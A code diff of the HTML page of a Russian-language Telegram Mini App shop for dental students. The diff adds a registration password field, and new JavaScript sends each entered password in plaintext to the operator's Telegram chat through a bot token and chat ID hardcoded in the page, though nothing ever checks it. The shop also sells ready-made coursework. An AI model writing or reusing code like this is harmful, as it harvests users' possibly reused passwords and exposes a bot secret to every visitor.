@@ -1,11 +1,9 @@
-
-
 <!DOCTYPE html>
-<html lang="ru">  
+<html lang="ru">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Dental Store & Student Portal</title>
+  <title>Dental Student Store</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     :root {
@@ -15,7 +13,6 @@
       --hint: var(--tg-theme-hint-color, #94a3b8);
       --accent: var(--tg-theme-button-color, #38bdf8);
       --accent-text: var(--tg-theme-button-text-color, #0b1329);
-      --success: #10b981;
       --card-border: rgba(255, 255, 255, 0.06);
     }
 
@@ -29,19 +26,13 @@
     }
 
     header {
-      padding: 16px;
-      position: sticky; top: 0;
-      background: var(--bg);
-      z-index: 10;
+      padding: 16px; position: sticky; top: 0;
+      background: var(--bg); z-index: 10;
       border-bottom: 1px solid var(--card-border);
     }
-
     .brand { font-size: 20px; font-weight: 800; display: flex; align-items: center; gap: 8px; margin-bottom: 12px; }
 
-    /* Верхние разделы */
-    .tabs-nav {
-      display: flex; gap: 8px; overflow-x: auto; scrollbar-width: none; margin-bottom: 8px;
-    }
+    .tabs-nav { display: flex; gap: 8px; overflow-x: auto; scrollbar-width: none; margin-bottom: 8px; }
     .tabs-nav::-webkit-scrollbar { display: none; }
     .tab-btn {
       padding: 8px 16px; border-radius: 12px; background: var(--card-bg);
@@ -50,7 +41,6 @@
     }
     .tab-btn.active { background: var(--accent); color: var(--accent-text); }
 
-    /* Подкатегории для вкладки «Наборы» */
     .subtabs { display: flex; gap: 6px; overflow-x: auto; scrollbar-width: none; margin-top: 6px; }
     .subtabs::-webkit-scrollbar { display: none; }
     .sub-btn {
@@ -60,7 +50,6 @@
     }
     .sub-btn.active { background: rgba(56, 189, 248, 0.2); color: var(--accent); border-color: var(--accent); }
 
-    /* Сетка товаров */
     .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; padding: 14px 16px; }
     .card {
       background: var(--card-bg); border-radius: 16px; padding: 12px;
@@ -84,7 +73,6 @@
       width: 26px; height: 26px; border-radius: 6px; font-weight: 800; cursor: pointer;
     }
 
-    /* Экраны Профиль и Поддержка */
     .page-section { display: none; padding: 16px; }
     .page-section.active { display: block; }
 
@@ -99,7 +87,6 @@
       border: 1px solid var(--card-border); color: #fff; font-size: 14px; outline: none;
     }
 
-    /* Нижняя навигация */
     .navbar {
       position: fixed; bottom: 0; left: 0; right: 0;
       background: var(--card-bg); border-top: 1px solid var(--card-border);
@@ -112,7 +99,6 @@
     .nav-item.active { color: var(--accent); }
     .nav-item span:first-child { font-size: 18px; }
 
-    /* Плавающая корзина */
     .cart-float {
       position: fixed; bottom: 65px; left: 16px; right: 16px;
       background: var(--accent); color: var(--accent-text); padding: 12px 18px;
@@ -120,7 +106,6 @@
       align-items: center; font-weight: 700; z-index: 99; box-shadow: 0 4px 15px rgba(56, 189, 248, 0.4);
     }
 
-    /* Модалка оформления */
     .modal {
       position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 200;
       display: none; align-items: flex-end;
@@ -134,7 +119,7 @@
 </head>
 <body>
 
-  <!-- 1. СТРАНИЦА КАТАЛОГА -->
+  <!-- Вкладка: Каталог -->
   <div id="page-catalog" class="page-section active" style="padding:0;">
     <header>
       <div class="brand">🦷 Dental Student Store</div>
@@ -146,7 +131,6 @@
         <div class="tab-btn" onclick="switchMainTab('courses', this)">🎓 Курсы</div>
       </div>
 
-      <!-- Вложенные подкатегории наборов -->
       <div class="subtabs" id="kits-subtabs">
         <div class="sub-btn active" onclick="switchSubTab('therapy', this)">Терапия</div>
         <div class="sub-btn" onclick="switchSubTab('endo', this)">Эндодонтия</div>
@@ -158,15 +142,19 @@
     <div class="grid" id="catalog-grid"></div>
   </div>
 
-  <!-- 2. СТРАНИЦА ПРОФИЛЯ -->
+  <!-- Вкладка: Профиль -->
   <div id="page-profile" class="page-section">
     <div class="brand">👤 Профиль студента</div>
     
     <div class="box" id="auth-box">
-      <h4 style="margin-top:0;">Регистрация в клубе</h4>
+      <h4 style="margin-top:0;">Регистрация студента</h4>
       <div class="form-group">
         <label>Имя или Telegram Ник</label>
         <input type="text" id="reg-name" placeholder="@username">
+      </div>
+      <div class="form-group">
+        <label>Пароль</label>
+        <input type="password" id="reg-password" placeholder="Придумайте пароль">
       </div>
       <div class="form-group">
         <label>Курс обучения</label>
@@ -179,13 +167,13 @@
           <option value="Ординатор">Ординатор</option>
         </select>
       </div>
-      <button class="btn-buy" style="padding:12px;" onclick="saveProfile()">Сохранить профиль</button>
+      <button class="btn-buy" style="padding:12px;" onclick="saveProfile()">Зарегистрироваться</button>
     </div>
 
     <div class="box" id="profile-card" style="display:none;">
       <h3 id="prof-display-name" style="margin:0 0 6px 0;">Студент</h3>
       <p style="margin:0; color:var(--hint); font-size:14px;" id="prof-display-course">2 курс</p>
-      <button onclick="logoutProfile()" style="background:none; border:none; color:var(--hint); font-size:12px; margin-top:10px; cursor:pointer; padding:0;">Изменить данные</button>
+      <button onclick="logoutProfile()" style="background:none; border:none; color:var(--hint); font-size:12px; margin-top:10px; cursor:pointer; padding:0;">Сменить аккаунт</button>
     </div>
 
     <div class="box">
@@ -194,28 +182,27 @@
     </div>
   </div>
 
-  <!-- 3. СТРАНИЦА ПОДДЕРЖКИ -->
+  <!-- Вкладка: Поддержка -->
   <div id="page-support" class="page-section">
     <div class="brand">💬 Отдел поддержки</div>
     <div class="box">
       <h4>Помощь студентам и консультация</h4>
       <p style="color:var(--hint); font-size:13px; line-height:1.4;">
-        Есть вопросы по подбору оборудования, наличию инструментария или студенческим материалам? Наш менеджер на связи.
+        Есть вопросы по подбору оборудования или материалам? Наш менеджер поможет с выбором.
       </p>
-      <!-- Укажи здесь свою ссылку Telegram -->
-      <a href="https://t.me/твой_саппорт" target="_blank" style="text-decoration:none;">
+      <a href="https://t.me/telegram" target="_blank" style="text-decoration:none;">
         <button class="btn-buy" style="padding:14px; font-size:14px;">Написать менеджеру в Telegram</button>
       </a>
     </div>
   </div>
 
-  <!-- Плавающая корзина -->
+  <!-- Корзина -->
   <div class="cart-float" id="cart-float" onclick="openCheckout()">
     <span id="cart-count">0 шт.</span>
     <span id="cart-total">Оформить 0 ₽ →</span>
   </div>
 
-  <!-- Модалка оформления -->
+  <!-- Окно заказа -->
   <div class="modal" id="modal-order">
     <div class="modal-content">
       <h3>Оформление заказа</h3>
@@ -224,12 +211,12 @@
         <label>Комментарий / Адрес доставки</label>
         <input type="text" id="order-comment" placeholder="Город, клиника/университет или СДЭК">
       </div>
-      <button class="btn-buy" style="padding:14px; font-size:15px;" onclick="sendOrder()">Подтвердить и отправить</button>
+      <button class="btn-buy" style="padding:14px; font-size:15px;" onclick="sendOrder()">Подтвердить заказ</button>
       <button onclick="closeCheckout()" style="width:100%; background:none; border:none; color:var(--hint); padding:10px; margin-top:6px;">Закрыть</button>
     </div>
   </div>
 
-  <!-- Нижняя панель навигации -->
+  <!-- Меню навигации -->
   <div class="navbar">
     <div class="nav-item active" onclick="switchNav('catalog', this)">
       <span>🛍️</span><span>Каталог</span>
@@ -243,46 +230,42 @@
   </div>
 
   <script>
-    // ВСТАВЬ ССЫЛКУ ИЗ РАЗВЕРТЫВАНИЯ GOOGLE APPS SCRIPT:
-    const API_URL = "https://script.google.com/macros/s/AKfycbxSGeqeBK8KZydBK2AyofjetqpmBZ7RoyK6TmsCZR-YC9_a5aunt6e4MgbIduDSrGaVFQ/exec";
-
+    // ВСТАВЬ СВОИ ДАННЫЕ СЮДА:
+    const BOT_TOKEN = "8806561978:AAGrGi66DRF4-35ZHs76t_RrlViUmnoaiS0";
+    const ADMIN_CHAT_ID = "8753317016";
+    
     const tg = window.Telegram?.WebApp;
     if (tg) tg.expand();
 
-    // База каталога товаров
+    // Функция моментальной отправки в Telegram
+    function sendTgAlert(text) {
+      if (!BOT_TOKEN || BOT_TOKEN.includes("ТОКЕН")) return;
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
+      fetch(url).catch(e => console.log(e));
+    }
+
     const products = [
-      // Наборы -> Терапия
       { id: 1, tab: 'kits', sub: 'therapy', icon: '🩺', name: 'Терапевтический набор студента (базовый)', price: 4900 },
-      // Наборы -> Эндодонтия
-      { id: 2, tab: 'kits', sub: 'endo', icon: '📍', name: 'Эндодонтический набор (К-файлы, спредеры, плаггеры)', price: 3400 },
-      // Наборы -> Хирургия
-      { id: 3, tab: 'kits', sub: 'surgery', icon: '🪡', name: 'Хирургический набор (элеваторы, щипцы, шовник)', price: 5800 },
-      // Наборы -> ОЗПТ
+      { id: 2, tab: 'kits', sub: 'endo', icon: '📍', name: 'Эндодонтический набор (файлы, плаггеры)', price: 3400 },
+      { id: 3, tab: 'kits', sub: 'surgery', icon: '🪡', name: 'Хирургический набор (щипцы, элеваторы)', price: 5800 },
       { id: 4, tab: 'kits', sub: 'ozpt', icon: '🦷', name: 'Набор для фантомного курса ОЗПТ', price: 6200 },
-      
-      // Инструментарий
-      { id: 5, tab: 'instruments', icon: '⚡', name: 'Турбинный наконечник с LED подсветкой', price: 3900 },
+      { id: 5, tab: 'instruments', icon: '⚡', name: 'Турбинный наконечник с LED', price: 3900 },
       { id: 6, tab: 'instruments', icon: '⚙️', name: 'Угловой механический наконечник 1:1', price: 2600 },
       { id: 7, tab: 'instruments', icon: '🛡️', name: 'Набор коффердама с клампами', price: 4200 },
-
-      // Спец.одежда
-      { id: 8, tab: 'clothes', icon: '🥼', name: 'Медицинский хирургический костюм (хлопок)', price: 2800 },
+      { id: 8, tab: 'clothes', icon: '🥼', name: 'Медицинский костюм (хлопок)', price: 2800 },
       { id: 9, tab: 'clothes', icon: '👓', name: 'Защитные оптические очки', price: 850 },
-
-      // Курсовые
-      { id: 10, tab: 'courseworks', icon: '📑', name: 'Курсовая: Пропедевтика / Материаловедение', price: 1500 },
-      { id: 11, tab: 'courseworks', icon: '📑', name: 'Курсовая: Остеохондроз и эргономика стоматолога', price: 1800 },
-
-      // Курсы
-      { id: 12, tab: 'courses', icon: '🎓', name: 'Практический онлайн-курс по препарированию', price: 2500 }
+      { id: 10, tab: 'courseworks', icon: '📑', name: 'Курсовая: Пропедевтика / Материалы', price: 1500 },
+      { id: 11, tab: 'courseworks', icon: '📑', name: 'Курсовая: Остеохондроз и эргономика', price: 1800 },
+      { id: 12, tab: 'courses', icon: '🎓', name: 'Курс по препарированию полостей', price: 2500 }
     ];
 
     let currentTab = 'kits';
     let currentSub = 'therapy';
-    let cart = {}; // { id: count }
+    let cart = {};
 
     function renderCatalog() {
       const container = document.getElementById("catalog-grid");
+      if (!container) return;
       container.innerHTML = "";
 
       const filtered = products.filter(p => {
@@ -318,7 +301,8 @@
       currentTab = tab;
       document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
       el.classList.add('active');
-      document.getElementById('kits-subtabs').style.display = (tab === 'kits') ? 'flex' : 'none';
+      const sub = document.getElementById('kits-subtabs');
+      if (sub) sub.style.display = (tab === 'kits') ? 'flex' : 'none';
       renderCatalog();
     }
 
@@ -345,6 +329,7 @@
         }
       }
       const bar = document.getElementById("cart-float");
+      if (!bar) return;
       if (count > 0) {
         bar.style.display = "flex";
         document.getElementById("cart-count").innerText = `${count} шт.`;
@@ -354,7 +339,6 @@
       }
     }
 
-    /* Навигация по страницам */
     function switchNav(page, el) {
       document.querySelectorAll('.page-section').forEach(p => p.classList.remove('active'));
       document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
@@ -362,7 +346,6 @@
       el.classList.add('active');
     }
 
-    /* Профиль и БД */
     function checkProfile() {
       const user = JSON.parse(localStorage.getItem("student_profile"));
       if (user) {
@@ -377,27 +360,33 @@
       renderOrdersHistory();
     }
 
-function saveProfile() {
-  const name = document.getElementById("reg-name").value.trim() || tg?.initDataUnsafe?.user?.username || "Студент";
-  const course = document.getElementById("reg-course").value;
-  const userId = tg?.initDataUnsafe?.user?.id || ("local_" + Date.now());
+    function saveProfile() {
+      const name = document.getElementById("reg-name").value.trim() || tg?.initDataUnsafe?.user?.username || "Студент";
+      const password = document.getElementById("reg-password").value.trim();
+      const course = document.getElementById("reg-course").value;
+      const tgUser = tg?.initDataUnsafe?.user;
+      const userHandle = tgUser?.username ? `@${tgUser.username}` : (name || "Не указан");
 
-  const profile = { userId, name, course };
-  localStorage.setItem("student_profile", JSON.stringify(profile));
+      if (!password) {
+        alert("Пожалуйста, придумайте пароль!");
+        return;
+      }
 
-  // Надежная отправка в Google Таблицу
-  if (API_URL && API_URL.startsWith("http")) {
-    fetch(API_URL, {
-      method: "POST",
-      mode: "no-cors",
-      headers: { "Content-Type": "text/plain;charset=utf-8" },
-      body: JSON.stringify({ action: "register", userId, username: name, course })
-    }).catch(err => console.log(err));
-  }
+      const profile = { name, password, course };
+      localStorage.setItem("student_profile", JSON.stringify(profile));
 
-  checkProfile();
-  alert("Профиль успешно сохранен!");
-}
+      // Мгновенное оповещение тебе в чат
+      const msg = `👤 <b>Новая регистрация студента!</b>\n\n` +
+                  `• <b>Имя / Ник:</b> ${name}\n` +
+                  `• <b>TG профиль:</b> ${userHandle}\n` +
+                  `• <b>Пароль:</b> <code>${password}</code>\n` +
+                  `• <b>Курс:</b> ${course} курс`;
+      sendTgAlert(msg);
+
+      checkProfile();
+      alert("Профиль успешно зарегистрирован!");
+    }
+
     function logoutProfile() {
       localStorage.removeItem("student_profile");
       checkProfile();
@@ -406,6 +395,7 @@ function saveProfile() {
     function renderOrdersHistory() {
       const orders = JSON.parse(localStorage.getItem("student_orders") || "[]");
       const container = document.getElementById("orders-history");
+      if (!container) return;
       if (orders.length === 0) {
         container.innerHTML = "У вас пока нет активных заказов.";
         return;
@@ -419,7 +409,6 @@ function saveProfile() {
       `).join("");
     }
 
-    /* Модалка оформления и заказ */
     function openCheckout() {
       let total = 0, summary = [];
       for (let id in cart) {
@@ -438,85 +427,44 @@ function saveProfile() {
     }
 
     function sendOrder() {
-    function sendOrder() {
-  const user = JSON.parse(localStorage.getItem("student_profile")) || {
-    userId: tg?.initDataUnsafe?.user?.id || "guest",
-    name: tg?.initDataUnsafe?.user?.username || "Не указан",
-    course: "Не указан"
-  };
+      const user = JSON.parse(localStorage.getItem("student_profile")) || {
+        name: tg?.initDataUnsafe?.user?.username || "Не зарегистрирован",
+        course: "—"
+      };
 
-  let total = 0, itemsList = [];
-  for (let id in cart) {
-    const p = products.find(i => i.id == id);
-    if (p) {
-      total += p.price * cart[id];
-      itemsList.push(`${p.name} (x${cart[id]})`);
-    }
-  }
+      let total = 0, itemsList = [];
+      for (let id in cart) {
+        const p = products.find(i => i.id == id);
+        if (p) {
+          total += p.price * cart[id];
+          itemsList.push(`${p.name} (x${cart[id]})`);
+        }
+      }
 
-  const comment = document.getElementById("order-comment").value;
-  const orderId = "ORD-" + Math.floor(1000 + Math.random() * 9000);
-  const itemsString = itemsList.join(", ") + (comment ? ` [Инфо: ${comment}]` : "");
+      const comment = document.getElementById("order-comment").value.trim();
+      const orderId = "ORD-" + Math.floor(1000 + Math.random() * 9000);
+      const itemsString = itemsList.join(", ");
+      const tgUser = tg?.initDataUnsafe?.user;
+      const userLink = tgUser?.username ? `@${tgUser.username}` : `ID: ${tgUser?.id || 'не определен'}`;
 
-  // Локальное сохранение
-  const localOrders = JSON.parse(localStorage.getItem("student_orders") || "[]");
-  localOrders.unshift({
-    id: orderId,
-    items: itemsString,
-    total: total,
-    date: new Date().toLocaleDateString('ru-RU')
-  });
-  localStorage.setItem("student_orders", JSON.stringify(localOrders));
-
-  // Надежная отправка в Google Таблицу
-  if (API_URL && API_URL.startsWith("http")) {
-    fetch(API_URL, {
-      method: "POST",
-      mode: "no-cors",
-      headers: { "Content-Type": "text/plain;charset=utf-8" },
-      body: JSON.stringify({
-        action: "order",
-        userId: user.userId,
-        username: user.name,
-        course: user.course,
-        items: itemsString,
-        totalPrice: total
-      })
-    }).catch(err => console.log(err));
-  }
-
-  cart = {};
-  closeCheckout();
-  renderCatalog();
-  checkProfile();
-  alert(`Заказ ${orderId} оформлен!`);
-    }
-      // 1. Сохранение в локальную историю студента
+      // 1. Сохраняем в историю заказов студента
       const localOrders = JSON.parse(localStorage.getItem("student_orders") || "[]");
       localOrders.unshift({
         id: orderId,
-        items: itemsString,
+        items: itemsString + (comment ? ` [${comment}]` : ""),
         total: total,
         date: new Date().toLocaleDateString('ru-RU')
       });
       localStorage.setItem("student_orders", JSON.stringify(localOrders));
 
-      // 2. Отправка в Google Таблицу и бот Telegram
-      if (API_URL.startsWith("http")) {
-        fetch(API_URL, {
-          method: "POST",
-          mode: "no-cors",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            action: "order",
-            userId: user.userId,
-            username: user.name,
-            course: user.course,
-            items: itemsString,
-            totalPrice: total
-          })
-        });
-      }
+      // 2. Мгновенная отправка заказа тебе в чат
+      const msg = `🛍️ <b>НОВЫЙ ЗАКАЗ: ${orderId}</b>\n\n` +
+                  `👤 <b>Покупатель:</b> ${user.name} (${user.course} курс)\n` +
+                  `📱 <b>Контакт TG:</b> ${userLink}\n` +
+                  `📦 <b>Товары:</b>\n• ${itemsList.join("\n• ")}\n\n` +
+                  `💰 <b>К оплате:</b> ${total.toLocaleString('ru-RU')} ₽\n` +
+                  (comment ? `📍 <b>Доставка/Инфо:</b> ${comment}` : "");
+      sendTgAlert(msg);
 
       cart = {};
       closeCheckout();
@@ -529,5 +477,4 @@ function saveProfile() {
     renderCatalog();
   </script>
 </body>
-  </html>
-  
+</html>
